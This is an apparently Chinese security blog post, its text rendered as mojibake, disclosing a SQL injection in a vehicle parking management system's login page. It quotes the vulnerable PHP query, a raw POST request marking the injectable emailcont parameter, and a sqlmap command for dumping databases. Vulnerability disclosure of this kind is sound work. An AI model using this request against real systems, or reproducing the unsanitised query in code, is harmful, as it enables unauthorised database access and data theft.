#  å›½å¤–æŸåœè½¦ç®¡ç†ç³»ç»ŸV1.13å­˜åœ¨å‰å°SQLæ³¨å…¥æ¼æ´   
åŸåˆ› Mstir  æ˜Ÿæ‚¦å®‰å…¨   2025-05-10 08:22  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
ç‚¹å‡»ä¸Šæ–¹  
è“å­—  
å…³æ³¨æˆ‘ä»¬ å¹¶è®¾ä¸º  
æ˜Ÿæ ‡  
## 0x00 å‰è¨€  
  
è½¦è¾†åœè½¦ç®¡ç†ç³»ç»Ÿæ˜¯ä¸€ç§åŸºäº Web çš„æŠ€æœ¯ï¼Œå®ƒå°†ç®¡ç†åœè½¦åœºè¿›å‡ºè½¦è¾†çš„è®°å½•ã€‚å¦‚æœè½¦è¾†å·²è¢«è®¿é—®ï¼Œç®¡ç†å‘˜å¾ˆå®¹æ˜“æ£€ç´¢æ•°æ®ï¼Œä»–å¯ä»¥é€šè¿‡å·ç è·å–è¯¥æ•°æ®ã€‚è½¦è¾†åœè½¦ç®¡ç†ç³»ç»Ÿæ˜¯ä¸€ç§è‡ªåŠ¨ç³»ç»Ÿï¼Œä»¥éå¸¸é«˜çš„é€Ÿåº¦æä¾›æ•°æ®å¤„ç†.  
  
![VPMS Home Page](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5e1rpUApFqPvLMBjiaM0gy78ibQZK7h3SVGusTCO7ruvQ2iaCTeSHLhKs74Jk5AQf7afdM9IjMRL2h7Q/640?wx_fmt=png&from=appmsg "")  
![VPMS - Admin Dashboard](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5e1rpUApFqPvLMBjiaM0gy78Od0fOZiaHayBeyUkHwtXgvENOuKaxUNqItPvzX00XibYHoxsWmY5hCGA/640?wx_fmt=png&from=appmsg "")  
  
ğŸ“ æ¼æ´ç”±æ˜Ÿç¾¤æ¼æ´åº“æ£€ç´¢å‘ç°Â   
ğŸ“  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c0pnVOIEDyfcqFT9sz1KBBs2D24FMOk24PuswdicY86zibuH2KhS2ic4Ovpgg9p4BLBnBNSWvYnAVyg/640?wx_fmt=png&from=appmsg "")  
## 0x01 æ¼æ´åˆ†æ&å¤ç°  
  
ä½äºÂ   
/users/login.php ä¸­é€šè¿‡POSTä¼ å…¥Â   
emailcont å‚æ•°åç›´æ¥è¢«å¸¦å…¥åˆ°SQLæŸ¥è¯¢å­—å¥ä¸­ï¼Œä¸”æœªåŠ è¿‡æ»¤ï¼Œå¯¼è‡´æ¼æ´äº§ç”Ÿã€‚```
<?php
session_start();
//error_reporting(0);
include('includes/dbconnection.php');
if(isset($_POST['login']))
Â  {
Â  Â  $emailcon=$_POST['emailcont'];
Â  Â  $password=md5($_POST['password']);
Â  Â  $query=mysqli_query($con,"select ID,MobileNumber from tblregusers where Â (Email='$emailcon' || MobileNumber='$emailcon') && Password='$password' ");
Â  Â  $ret=mysqli_fetch_array($query);
Â  Â Â if($ret>0){
Â  Â  Â  $_SESSION['vpmsuid']=$ret['ID'];
Â  Â  Â  $_SESSION['vpmsumn']=$ret['MobileNumber'];
Â  Â  Â header('location:dashboard.php');
Â  Â  }
Â  Â Â else{
Â Â 
Â  Â Â echoÂ "<script>alert('Invalid Details.');</script>";
Â  Â  }
Â  }
Â Â ?>

```  
  
  
Payload:```
POST /vms/vpms/users/login.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=fts8bkugo602dkngvre7tbqn6t
Host: 192.168.65.5:8080
Origin: http://192.168.65.5:8080
Referer: http://192.168.65.5:8080/vms/vpms/users/login.php
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36

emailcont=1234567890*&password=1*&login=

```  
  
  
sqlmap -r sql.txt --batch --risk 3 --level 5 --dbs  
  
![image-20250409135424612](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5e1rpUApFqPvLMBjiaM0gy78EdgZkH7k56icKiceIWXWmDXRcbxWjkBB3qmib2TMYPbbZwzHkfS8P5HZA/640?wx_fmt=png&from=appmsg "")  
## 0x02 æºç ä¸‹è½½  
  
**æ ‡ç­¾:ä»£ç å®¡è®¡ï¼Œ0dayï¼Œæ¸—é€æµ‹è¯•ï¼Œç³»ç»Ÿï¼Œé€šç”¨ï¼Œ0dayï¼Œé—²é±¼ï¼Œè½¬è½¬**  
  
  
**åœè½¦ç®¡ç†ç³»ç»Ÿå…³æ³¨å…¬ä¼—å·ï¼Œå‘é€ 250510 è·å–!**  
  
  
Â  Â  Â æœ‰å®¡è®¡ä¸Šæˆ–è€…æ¼æ´ç›¸å…³çš„é—®é¢˜å¯ä»¥åŠ ä¸‹æ–¹å°åŠ©ç†ç§ä¿¡è¯¢é—®ï¼Œä»£ç å®¡è®¡è¯¾ç¨‹ç¬¬äºŒæœŸï¼ŒçŸ¥è¯†æ˜Ÿçƒï¼ŒCISP-PTE ç­‰è¯ä¹¦ï¼Œç­‰ç›¸å…³äº‹å®œä¹Ÿå¯ç§ä¿¡ï¼Œå…¨ç½‘ä½ä»·.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5e1rpUApFqPvLMBjiaM0gy781Ce9lpvibVO8y8wA4RT3h6TQibpm718QQeUB8pVZ6SOJ6FZnmIhHIuyg/640?wx_fmt=jpeg&from=appmsg "")  
  
**å…è´£å£°æ˜:****æ–‡ç« ä¸­æ¶‰åŠçš„ç¨‹åº(æ–¹æ³•)å¯èƒ½å¸¦æœ‰æ”»å‡»æ€§ï¼Œä»…ä¾›å®‰å…¨ç ”ç©¶ä¸æ•™å­¦ä¹‹ç”¨ï¼Œè¯»è€…å°†å…¶ä¿¡æ¯åšå…¶ä»–ç”¨é€”ï¼Œç”±è¯»è€…æ‰¿æ‹…å…¨éƒ¨æ³•å¾‹åŠè¿å¸¦è´£ä»»ï¼Œæ–‡ç« ä½œè€…å’Œæœ¬å…¬ä¼—å·ä¸æ‰¿æ‹…ä»»ä½•æ³•å¾‹åŠè¿å¸¦è´£ä»»ï¼Œæœ›å‘¨çŸ¥ï¼ï¼!**  
  
